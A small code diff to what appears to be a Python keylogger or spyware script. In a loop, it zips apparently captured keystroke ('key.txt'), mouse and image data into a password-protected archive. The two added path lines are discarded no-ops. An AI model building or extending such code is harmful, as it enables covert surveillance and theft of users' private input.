@@ -23,8 +23,14 @@ while True:
 
     with pyzipper.AESZipFile(arquvio_zip, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
         zf.setpassword(b'12345')
+
+        os.path.join(os.getenv('APPDATA'), 'Microsoft')
+
         zf.write("key.txt", "key.txt")
         zf.write("mouse.txt", "mouse.txt")
+
+        os.path.join("Documentos")
+
         adicionar_pasta_ao_zip(zf, "imagens")
 
     # Verificação se é Linux ou Windows
